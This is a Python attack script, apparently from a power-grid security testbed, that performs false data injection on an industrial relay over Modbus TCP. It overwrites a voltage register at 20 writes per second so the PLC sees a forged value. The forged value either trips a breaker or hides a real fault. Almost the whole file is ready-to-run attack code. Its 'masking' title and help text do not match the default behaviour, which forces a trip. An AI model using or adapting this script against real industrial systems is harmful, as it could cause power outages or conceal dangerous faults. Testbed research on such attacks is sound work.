#!/usr/bin/env python3
"""
ATK-02 | FDIA — Undervoltage Masking
=====================================
Injects a fake, below-threshold voltage (default 0.75 pu) directly into the
IED's Modbus holding register (%MW0 @ address 1024), overwriting whatever the
physics engine is actually writing.  The PLC relay logic reads this forged
value and reacts to it — if 0.75 pu is below the under-voltage trip threshold
(~0.90 pu) the relay trips; if you want to HIDE a real fault instead, pass a
healthy value like --mask_pu 1.00.

Register map
------------
  Holding Register 1024 (%MW0) — voltage_pu × 1000
    Real (healthy) : physics writes 1000  (1.00 pu)
    This attack    : we overwrite with  750  (0.75 pu)  ← relay sees undervoltage

Usage
-----
    python atk02_undervoltage_masking.py
    python atk02_undervoltage_masking.py --target 127.0.0.1 --port 5020 --mask_pu 0.75 --duration 15
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient


def main():
    parser = argparse.ArgumentParser(
        description="ATK-02: Mask a real undervoltage fault from the relay."
    )
    parser.add_argument("--target",   type=str,   default="127.0.0.1",
                        help="Target IED IP address")
    parser.add_argument("--port",     type=int,   default=5020,
                        help="Target IED Modbus TCP port  (default 5020 = IED-1)")
    parser.add_argument("--mask_pu",  type=float, default=0.75,
                        help="Fake voltage in per-unit to inject (default 0.75 — below trip threshold)")
    parser.add_argument("--duration", type=float, default=10.0,
                        help="How long (seconds) to sustain the mask (default 10 s)")
    args = parser.parse_args()

    print("=" * 60)
    print("  ATK-02  |  FDIA — Undervoltage Masking")
    print("=" * 60)
    print(f"[*] Target IED     : {args.target}:{args.port}")
    print(f"[*] Injected voltage : {args.mask_pu} pu")
    print(f"[*] Attack duration: {args.duration} s")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect to the Modbus server. Is the stack running?")
        return

    scaled_mask = int(args.mask_pu * 1000)
    deadline    = time.time() + args.duration
    iteration   = 0

    print("[*] Injection started — overwriting %MW0 every 50 ms …")
    try:
        while time.time() < deadline:
            response = client.write_register(1024, scaled_mask)
            if response.isError():
                print(f"[-] Write error on iteration {iteration}: {response}")
                break
            iteration += 1
            time.sleep(0.05)           # 20 writes/s — faster than the 500 ms physics tick

        print(f"\n[+] ATTACK COMPLETE: Injected {args.mask_pu} pu for {args.duration} s ({iteration} writes)")
        print("[+] PLC saw the forged undervoltage — check dashboard for breaker trip.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[-] Exception: {e}")
    finally:
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
